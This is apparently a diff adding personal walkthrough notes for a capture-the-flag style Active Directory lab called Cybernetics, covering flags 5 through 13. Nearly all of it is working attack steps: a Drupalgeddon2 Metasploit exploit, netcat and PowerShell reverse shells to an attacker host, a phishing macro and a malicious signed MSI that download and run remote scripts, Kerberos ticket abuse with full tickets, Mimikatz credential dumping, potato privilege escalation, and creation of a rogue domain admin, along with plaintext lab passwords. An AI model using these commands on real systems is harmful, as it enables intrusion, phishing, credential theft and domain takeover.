@@ -1,0 +1,181 @@
+=====================================
+== FLAG 5 - Welcome to Cybernetics ==
+=====================================
+Cyb3rN3t1C5{W3lC0m3_2_Cyb3rn3t!cs}
+set up proxy through sql box
+msfconsole
+use unix/webapp/drupal_drupalgeddon2
+set Proxies socks5:127.0.0.1:1080
+set RHOSTS 10.9.15.11
+set payload php/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 8443
+set ReverseAllowProxy true
+run
+
+shell 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.X 443 >/tmp/f
+
+==============================================
+== FLAG 6 - The art of writing descriptions ==
+==============================================
+CORE\george.wirth v765#QLm^8
+from the drupal box run this command
+/opt/pbis/bin/adtool --keytab=/etc/krb5.keytab --logon-as=COREWEBDL$ -a lookup-object --attr=description --dn 'CN=George Wirth,OU=Interns,OU=Users,OU=core,DC=core,DC=cyber,DC=local'
+v765#QLm^8 #Cyb3rN3t1C5{Cr3d$_!n_De$cr!pti0ns}
+george.wirth
+
+===================================
+== FLAG 7 - Fisherman's Training ==
+===================================
+Create Certs of george.wirth as shown in the link from the drupal site.
+Use a docm with macro.
+https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba
+Open Word -> View -> Macros -> name anything -> Create -> enter vba code from site above.
+edit last powershell comandlet:
+cmdStr = "powershell.exe -noexit -ep bypass -c IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.14.X/reverseshell.ps1'))  #"
+# note: reverseshell.ps1 is just a nishang oneliner with amsi bypass
+Save Word Doc as document.docm
+Email ilene.rasch and attach the docm
+after you get snarky email, you should get a call back.
+Once you get a shell as ilene:
+schtasks /query /v /tn:openemail
+Cyb3rN3t1C5{Y0u_C@nt_Ph!$h_M3}
+see Invoke-Email is running
+look at powershell modules
+type "C:\Program Files\WindowsPowerShell\Modules\Invoke-OpenEmail\Invoke-OpenEmail.psm1"
+
+
+========================================
+== FLAG 8 - Secure credential storage ==
+=========================================
+browse the shares as ilene:
+\\cyfs.core.cyber.local\devops
+\\cyfs.core.cyber.local\groupshare
+decrypt aes from devops using this script:
+https://raw.githubusercontent.com/arthepsy/ringzer0-challenges/master/crypto.ch55.py
+password: to7oxaith2Vie9
+do a for loop of all devops users to see who can successfully mount the shares. Password is for robert.ortiz
+net use z: \\cyfs.cyber.local\groupshare /user:CYBER\robert.ortiz to7oxaith2Vie9
+net use z: \\cyfs.cyber.local\devops /user:CYBER\robert.ortiz to7oxaith2Vie9
+type z:\flag.txt
+Cyb3rN3t1C5{D3vOP$_S3cure_Cr3d$}
+
+
+===============================================
+== FLAG 9 - Signature required upon delivery ==
+===============================================
+Cyb3rN3t1C5{D3vOP$_C0d3_S!gning}
+install wix
+save this as bad.wix
+
+<?xml version="1.0"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+    <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
+        <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
+        <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
+        <Directory Id="TARGETDIR" Name="SourceDir">
+            <Directory Id="ProgramFilesFolder">
+                <Directory Id="INSTALLLOCATION" Name="Example">
+                 <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
+                    </Component>
+                </Directory>
+            </Directory>
+        </Directory>
+        <Feature Id="DefaultFeature" Level="1">
+            <ComponentRef Id="ApplicationFiles"/>
+        </Feature>
+        <CustomAction Id="SystemShell" Directory="TARGETDIR" ExeCommand="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex (iwr http://10.10.14.X/test.ps1 -UseBasicParsing)" Execute="deferred" Impersonate="no" Return="ignore"/>
+        <InstallExecuteSequence>
+            <Custom Action="SystemShell" After="InstallInitialize"></Custom>
+        </InstallExecuteSequence>
+    </Product>
+</Wix>
+
+then run:
+candle.exe bad.wix
+light.exe bad.wixobj
+on your windows box cred certs for robert.
+install signtool.exe
+sha1 is footprint of signing cert
+signtool.exe sign /sha1 a5c990bf80ecfb09f4ebeabce227b0194f0fabc9 bad.msi
+test.ps1 is nishang oneliner with amsi bypass
+as ilene run this
+msiexec /quiet /qn /i C:\Users\ilene.rasch\downloads\bad.msi
+
+
+=================================
+== FLAG 10 - Not again Steven! ==
+==================================
+Cyb3rN3t1C5{CR3@t0rS!D}
+As SYSTEM grab tgt 
+cmd /c Rubeus.exe tgtdeleg /nowrap
+
+create tgt for administrator
+cmd /c Rubeus.exe s4u /user:COREWKT001 /ticket:doIFQDCCBTygAwIBBaEDAgEWooIENjCCBDJhggQuMIIEKqADAgEFoRIbEENPUkUuQ1lCRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPUkUuQ1lCRVIuTE9DQUyjggPmMIID4qADAgESoQMCAQKiggPUBIID0JLe5vEQD/CQhC1ulWJ9gZO4AB+3XaqKUaesjACSCvf3AvssizShW8TsH9Wh3yokHukcAzjyOonPuyctq1mXSDWQ2nTLEPMIso8omBHsQsKev59m1zU+1MXoqBaH2N+xSwuWGEMDDLfkbLaNOV6N+7p7Z71NIR7nXTYcTGB8aHco4kWOb2mX/FZbTv5yden17WoDWHkcnVvqfoeU0IuzA82l5TJG91Pd25m7l52TL/kT+gVixHXJU9cBOv2iARhvWnJpPDtQCpxXHZW9P4cMy7qlDQljBewl/+Lb0A6qskPIWhgSjkNYk5nZBGNNK0O7e8Ips6t81xzh7q8HHyPKjqXaXsp5jd1MfgI8xAvpURZLu27/0zRe5XChd0SFQo8Wi8lg1/HPyVXoWI9o3lGHDyufrZNcy0sixXYh1QvlntUqe7vb5QZrvUdSkWe/S1B8qwaeXi5KIjUBF2l1PlRjzvPA2iMxx1FT/azktSebItlhXoCKC1ecpTOAiUCrr1Wv6l01YY2/lDt1esYoCVZEGD+lbO+fEtG7kmpyDheQHCs9M9bU5pswvQfRquGBGzKPXwlWB354jkxBEPl8HDOEf8j/zIx5L4zWsR+y9+eaowSiWZdz7YyXkmwVMROtMe6Rj6Lf0XDns6q+3+AnxW+BUPFizcVpZ8HaNzOvUHc2XmFNwq7A4m3Qzo8Mmtu64D+xK2NjWjiCbvfFkKE1raZYa0yGUN72Tj50RkPUo2q4/IQsDQieoWwsmNiyN9s01HQD7RSyfyJz6k3lJE6McuDYuLn3uBpc4eyoRumTn+BLvGn6MmzyTsyZot+4Jcy7SfP4RHG4SIAInKJmB7aXhpfo0a76GQkUIV6qf8cvkcaUS2Gc/xtke3vO12Z7LdhtcqAVuoLskK+6AdWvnSSOHZQ9Qz4XURtHTiPaXKnfZj1hEmlCdlYcJCc1nm+Yvr+ZccrmvIAPAckjWFs8VCEPNdmY/c7PiQgyl9y1ek5XCJ5KEu3UmvjCUvaLaWt9ic2pVbAFyZXIWkWqZbsmPLsGoXPXGA3UaWQVAoSq7AxK15KJL1Sdmep17lXTuciuuLpiitErhTYpcL4aih+h173yMsRehUNZyanPlBZBr+8DJPibu4gEx/sRtlMQ0zlqzxia3T4B24oIehEvSHBJ5COj2fmVPkYifzPSZ9nX8ui6BHcwG2vpKIEtaMG9Kx7Bj8k5Q8WXp0OxlsYVwiIZEmOB/IEqdbmXWBYZOaWb2JLBL56RwlCqGwDV4hbSHi4BDKozTRf1sWrdLFH+XKC8Un561jdNHsKjgfUwgfKgAwIBAKKB6gSB532B5DCB4aCB3jCB2zCB2KArMCmgAwIBEqEiBCD9eoQzlEfmHP1ARMDn1GpZvWCZ58Poo+qqW2NJbGRCaKESGxBDT1JFLkNZQkVSLkxPQ0FMohgwFqADAgEBoQ8wDRsLY29yZXdrdDAwMSSjBwMFAGChAAClERgPMjAyMDA0MzAxNDA1NDRaphEYDzIwMjAwNTAxMDAwNTI4WqcRGA8yMDIwMDUwNzE0MDUyOFqoEhsQQ09SRS5DWUJFUi5MT0NBTKklMCOgAwIBAqEcMBobBmtyYnRndBsQQ09SRS5DWUJFUi5MT0NBTA== /impersonateuser:Administrator /msdsspn:cifs/COREWKT002.CORE.CYBER.LOCAL /altservice:termsrv,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt
+
+$sess = New-PSSession -ComputerName COREWKT002.CORE.CYBER.LOCAL
+Invoke-Command -ScriptBlock { type C:\Users\Administrator\flag.txt} -Session $sess
+
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
+zui4uaS8oeng
+
+
+make_token CORE\steven.sanchez zui4uaS8oeng
+powerpick $sess = New-PSSession -ComputerName corewebtw.core.cyber.local; Invoke-Command -ScriptBlock {iex (new-object net.webclient).downloadstring('http://10.10.14.X/reverseshell.ps1')} -Session $sess
+cat tomcat-users.xml
+<user username="tomcat" password="y4mEcAmk!%9j" roles="manager-gui" />
+
+========================================
+== FLAG 11 - Curiosity killed the cat ==
+========================================
+Steven Sanchez can PSSession into webbox.
+$username = 'CORE\steven.sanchez';$password = 'zui4uaS8oeng';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -ComputerName corewebtw.core.cyber.local -Credential $credential -ScriptBlock {cmd /c "powershell -exec bypass iex ((new-object net.webclient).downloadstring('http://10.10.14.X/reverseshell.ps1'))"}
+Tomcat is running use msfvenom to generate payload 
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.X LPORT=443 -f war > reverse.war
+upload this to C:\Tomcat\webapps
+start tomcat
+C:\Tomcat\bin\startup.bat
+using proxy browse (or maybe just curl) to http://10.9.15.12/reverse
+shell as network service, use juicypotato to exploit
+juicy.exe -t * -l 1337 -p C:\Windows\system32\cmd.exe -a "/c C:\temp\nc.exe -e cmd 10.10.14.X 443"
+type C:\Users\Administrator\flag.txt
+Cyb3rN3t1C5{T0mc@t_W3b@pp$}
+
+
+rubeus.exe ptt /ticket:doIFBjCCBQKgAwIBBaEDAgEWooIEETCCBA1hggQJMIIEBaADAgEFoQ0bC0NZQkVSLkxPQ0FMoiAwHqADAgECoRcwFRsGa3JidGd0GwtDWUJFUi5MT0NBTKOCA8swggPHoAMCARKhAwIBBKKCA7kEggO1ZN7hnURT35yp6TtSEo/7G/jQp48cqnAhFAi8dUE+quoCvFVIDrZuRyaPtMYOWliyPqHtW3RNUpO2PRRWjP1/OOJnVxbk9VWqpS6KpO4QN+kX9o7R2spC4JC5QwyB7MJauCrrfwBJXTmE9VOM3q5LOJ3YVl3r8HuuhyJLhTo7xULnZU5cxu+/xOY+jRzNrB6lbWfHaiftzdCuD0m0Bt+egNHbW2AJU49+c3/KVvBSqHXbfrQ04kg0aDSNqF0hXwxFd259WHVJD90gj/+RTimqrONBxEqpT5z6wTJ5O3QC6+Mz8ei54h6U38xZzEzyUn8sD3IWJJq2LHPtWvVx29wm8FEDCPr/BSDitkcfmxV5q2Gq/ugMKzhNth862WHsDiF8oP2nmlv4ggZPAeAQKp4T2/V7EowIApmCYKXQ1VJ/PuuoWDh/ow8EpGJZ1mXIlEAVDu8HrgK81SxiIO4IZHEWDhW+Q8/jOdklUvYVHq9X6CsqX0IgRU4YeTfqYisuxhybxknhBOywtd/MXhCOBZ5J05nUTuyn0rdbRzJy7kZwJYzkYZp60pblR7FksHsADSjqbo1uAB/dHsLZJw8LM6qq9ux1pZ+wL9wjNLJI/v6ITOz3HxAo7ELj7trlBrB4wQjVxnwJxpV6RrwNk8ZXLRhzAajwRoc09f8dmSGwR6Mmm8ryLuVhZW+oprUmevddsQdcv+vpOpUcR0244flq1vOSRgaMC39ucNGOM9JOFfR0yzkm/SVdBga9/RoXkhP+NoAKp8X4Rndat7jVi9a6FccGVdCZev4Par/tb/LeWLe5/pTG6a+JXYDf1HqOSit8a+xSd+KWdOjqCT93CVB2ldh4wE0yaCfQTbkoY4qRRbUgMNpTXwiEylLV20bkzqiBnhxBPzdmqk0AwD76qcel+SOC/u1s8BbVSh/K2y1kLtyv3Oj728MjO0IvfveVLfgn6o1Um5cJAXSqjX/82JTzmy7ukpl7KQ3jYBspUGTOnbDZ1jEPccy26TuRaRgtp/aYz2iJk94Jr0Hf6pXLEbvE/hVkuSX/+g56nLuEr5IUVCQcPWCazj5jCMhYi+UR2p9PezN39DpF86XTBep7Zr/XVstt1hSuslN1HFVbvw5Yvgyeg6ZKWtCQ8lZrP+pNNcQbvw9OHh06KuvUJP1aYerq70XiX5QhDqJHs8p3Bvc87AEhJN1eshoCe33frOYzzI5Fgnitkt78VcXTMhn3UnBJcRWtt2YXFvnnxuuZv16iv5Q+wYWzdih9gaOB4DCB3aADAgEAooHVBIHSfYHPMIHMoIHJMIHGMIHDoCswKaADAgESoSIEIDT0bfCFeYJ6AiIEiWZFTCof+IENrwXWJCuXVwjkwwmNoQ0bC0NZQkVSLkxPQ0FMohIwEKADAgEBoQkwBxsFY3lteCSjBwMFAGChAAClERgPMjAyMDA1MDQwNjUxNDNaphEYDzIwMjAwNTA0MTY0NjU2WqcRGA8yMDIwMDUxMTA2NDY1NlqoDRsLQ1lCRVIuTE9DQUypIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC0NZQkVSLkxPQ0FM
+
+======================================
+== FLAG 12  - The parent knows best ==
+======================================
+use spoolsample against cymx. cymx$ the pssesion into cymx, lsadump::secrets to get john.braud password, then pssession into dc
+as SYSTEM on webtw.
+rubeus.exe monitor /interval:1
+in another session, verify spool is running on servers
+ls \\cymx.cyber.local\pipe\spoolss
+spoolsample.exe cymx.cyber.local corewebtw.core.cyber.local
+hash should appear in rubeus window.
+I couldn't use ptt from netcat, so i used CS beacon instead.
+Rubeus.exe ptt /ticket:<base64>
+shell r.exe ptt /ticket:doIFBjCCBQKgAwIBBaEDAgEWooIEETCCBA1hggQJMIIEBaADAgEFoQ0bC0NZQkVSLkxPQ0FMoiAwHqADAgECoRcwFRsGa3JidGd0GwtDWUJFUi5MT0NBTKOCA8swggPHoAMCARKhAwIBBKKCA7kEggO1ZN7hnURT35yp6TtSEo/7G/jQp48cqnAhFAi8dUE+quoCvFVIDrZuRyaPtMYOWliyPqHtW3RNUpO2PRRWjP1/OOJnVxbk9VWqpS6KpO4QN+kX9o7R2spC4JC5QwyB7MJauCrrfwBJXTmE9VOM3q5LOJ3YVl3r8HuuhyJLhTo7xULnZU5cxu+/xOY+jRzNrB6lbWfHaiftzdCuD0m0Bt+egNHbW2AJU49+c3/KVvBSqHXbfrQ04kg0aDSNqF0hXwxFd259WHVJD90gj/+RTimqrONBxEqpT5z6wTJ5O3QC6+Mz8ei54h6U38xZzEzyUn8sD3IWJJq2LHPtWvVx29wm8FEDCPr/BSDitkcfmxV5q2Gq/ugMKzhNth862WHsDiF8oP2nmlv4ggZPAeAQKp4T2/V7EowIApmCYKXQ1VJ/PuuoWDh/ow8EpGJZ1mXIlEAVDu8HrgK81SxiIO4IZHEWDhW+Q8/jOdklUvYVHq9X6CsqX0IgRU4YeTfqYisuxhybxknhBOywtd/MXhCOBZ5J05nUTuyn0rdbRzJy7kZwJYzkYZp60pblR7FksHsADSjqbo1uAB/dHsLZJw8LM6qq9ux1pZ+wL9wjNLJI/v6ITOz3HxAo7ELj7trlBrB4wQjVxnwJxpV6RrwNk8ZXLRhzAajwRoc09f8dmSGwR6Mmm8ryLuVhZW+oprUmevddsQdcv+vpOpUcR0244flq1vOSRgaMC39ucNGOM9JOFfR0yzkm/SVdBga9/RoXkhP+NoAKp8X4Rndat7jVi9a6FccGVdCZev4Par/tb/LeWLe5/pTG6a+JXYDf1HqOSit8a+xSd+KWdOjqCT93CVB2ldh4wE0yaCfQTbkoY4qRRbUgMNpTXwiEylLV20bkzqiBnhxBPzdmqk0AwD76qcel+SOC/u1s8BbVSh/K2y1kLtyv3Oj728MjO0IvfveVLfgn6o1Um5cJAXSqjX/82JTzmy7ukpl7KQ3jYBspUGTOnbDZ1jEPccy26TuRaRgtp/aYz2iJk94Jr0Hf6pXLEbvE/hVkuSX/+g56nLuEr5IUVCQcPWCazj5jCMhYi+UR2p9PezN39DpF86XTBep7Zr/XVstt1hSuslN1HFVbvw5Yvgyeg6ZKWtCQ8lZrP+pNNcQbvw9OHh06KuvUJP1aYerq70XiX5QhDqJHs8p3Bvc87AEhJN1eshoCe33frOYzzI5Fgnitkt78VcXTMhn3UnBJcRWtt2YXFvnnxuuZv16iv5Q+wYWzdih9gaOB4DCB3aADAgEAooHVBIHSfYHPMIHMoIHJMIHGMIHDoCswKaADAgESoSIEIDT0bfCFeYJ6AiIEiWZFTCof+IENrwXWJCuXVwjkwwmNoQ0bC0NZQkVSLkxPQ0FMohIwEKADAgEBoQkwBxsFY3lteCSjBwMFAGChAAClERgPMjAyMDA1MDQwNjUxNDNaphEYDzIwMjAwNTA0MTY0NjU2WqcRGA8yMDIwMDUxMTA2NDY1NlqoDRsLQ1lCRVIuTE9DQUypIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC0NZQkVSLkxPQ0FM
+ls \\cymx.cyber.local\c$
+$sess = New-PSSession -ComputerName cymx.cyber.local
+Invoke-Command -ComputerName CYDC.cyber.local -Session $sess -ScriptBlock {cmd /c "powershell -exec bypass iex ((new-object net.webclient).downloadstring('http://10.10.14.X/reverseshell.ps1'))"}
+After Getting reverse shell as cymx$ run mimikatz
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::lsasecrets"'
+$username = 'CYBER\John.Braud';$password = '0@39Xs!X5$';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -ComputerName CYDC.cyber.local -Credential $credential -ScriptBlock {cmd /c "powershell -exec bypass iex ((new-object net.webclient).downloadstring('http://10.10.14.X/reverseshell.ps1'))"}
+type C:\Users\Administrator\flag.txt
+Cyb3rN3t1C5{P@r3nt_D0ma!n_T@ke0v3r}
+
+
+===================================
+== FLAG 13 - Rebellious children ==
+===================================
+I added pwnuser to domain admins and enterprise admins then xfreerdp into it
+net user pwnPassword1! /add /domain
+net group "Domain Admins" pwn/add /domain
+net group "Enterprise Admins" pwn/add /domain
+now psexec into coredc.core.cyber.local
+Cyb3rN3t1C5{Ch!ld_D0ma!n_T@ke0v3r}
+
+
